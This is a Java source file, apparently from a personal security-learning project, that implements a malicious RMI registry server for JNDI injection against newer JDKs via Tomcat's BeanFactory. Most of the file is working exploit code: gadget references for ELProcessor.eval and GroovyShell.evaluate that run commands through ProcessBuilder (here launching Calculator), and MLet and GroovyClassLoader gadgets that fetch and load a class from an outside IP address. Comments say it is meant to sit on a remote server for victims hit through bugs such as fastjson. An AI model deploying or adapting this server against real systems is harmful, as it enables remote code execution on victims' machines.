package com.xjjlearning.hack.java.highjdk;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import groovy.lang.GroovyClassLoader;
import groovy.lang.GroovyShell;
import org.apache.naming.ResourceRef;

import javax.el.ELProcessor;
import javax.naming.StringRefAddr;
import javax.naming.spi.NamingManager;
import javax.script.ScriptEngineManager;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 这个server应该放到远程服务器, 当发送给受害者比如fastjson漏洞的时候来远程lookup我们的registry绑定的类, 加载到本地
 */
public class TomcatBeanFactoryServer {

    // Bean的选择
//    1.JDK或者常用库的类
//    2.有public修饰的无参构造方法
//    3.public修饰的只有一个String.class类型参数的方法，且该方法可以造成漏洞(可多个方法组合)

    /**
     * javax.el.ELProcessor#eval
     * groovy.lang.GroovyShell#evaluate
     */


    // ...
    // InitialContext#lookup("rmi://127.0.0.1:1099/Calc");
    //  GenericURLContext#lookup()
    //   RegistryContext#lookup()
    //    NamingManager#getObjectInstance()
    //     org.apache.naming.factory.BeanFactory#getObjectInstance(ref, name, nameCtx, environment);
    //      method.invoke(bean, valueArray);
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

//        ResourceRef ref = elProcessorEval();
//        ResourceRef ref = groovyShellEvaluate();
        ResourceRef ref = mLet();
//        ResourceRef ref = groovyClassLoader();

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Calc", referenceWrapper);  // 绑定目录名
        System.out.println("Server Started!");
    }

    private static ResourceRef elProcessorEval() {
//        ELProcessor
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
//        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
//        ref.add(new StringRefAddr("forceString", "bitterz=eval"));
        // 指定bitterz属性指定其setter方法需要的参数，实际是ElProcessor.eval方法执行的参数，利用表达式执行命令
//        ref.add(new StringRefAddr("bitterz", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ref.add(new StringRefAddr("forceString", "x=eval")); // name=method, x属性使用eval这个setter赋值
        // 给x使用setter赋值时传入的参数
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));

        // 这个eval是如何写出的？ -> EL表达式
        // ScriptEngineManager支持java和其他语言互相调用
        // Class.newInstance()只能反射无参的构造器
//        ScriptEngineManager m = (ScriptEngineManager) "".getClass().forName("javax.script.ScriptEngineManager").newInstance();
//        m.getEngineByName("JavaScript").eval("");
        return ref;
    }

    private static ResourceRef groovyShellEvaluate() {
//        GroovyShell
//        GroovyShell允许在Java类中（甚至Groovy类）求任意Groovy表达式的值。您可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));
        return ref;
    }

    // 用来探测是否有类, 没有则抛出异常
    // 通过 URLClassloader 去远程加载类
    private static ResourceRef mLet() {
//        javax.management.loading.MLet
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
//        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", "http://47.95.7.37:9870/"));
        ref.add(new StringRefAddr("c", "Calc"));
        return ref;
    }
    private static ResourceRef groovyClassLoader() {
        // GroovyClassLoader：用 Groovy 的 GroovyClassLoader ，动态地加载一个脚本并执行它的行为。GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass")); // name=method, x属性使用eval这个setter赋值
        ref.add(new StringRefAddr("a", "http://47.95.7.37:9870/"));
        ref.add(new StringRefAddr("b", "Calc"));
        return ref;
    }
}